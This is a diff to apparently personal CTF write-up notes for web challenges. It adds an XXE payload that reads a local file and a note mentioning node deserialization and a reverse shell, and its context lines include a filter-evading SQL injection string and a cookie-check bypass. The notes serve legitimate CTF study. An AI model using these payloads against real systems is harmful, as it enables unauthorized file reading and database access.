@@ -76,7 +76,24 @@ def load_cookie():
 Thrown exceptions pass the `load_cookie` check, so just send request with no `digest` field in the cookie
 
 ## Seriously (125)
+
+https://github.com/gr455/ctf-writeups/blob/master/nahamcon20/seriously.md
+- node deserialization vulnerability
+- node reversse shell
+- (?) ngrok tcp server
+
 ## Extraterrestrial (125)
+
+```xml
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
+<message>
+<id></id>
+<message>&xxe;</message>
+<title>xml</title>
+</message>
+```
+
 ## Rejected Sequel (150)
 
 `"/**/union/**/select/**/flag/**/FFROMROM/**/flag/**/WWHEREHERE/**/TRUE/**/or/**/""="
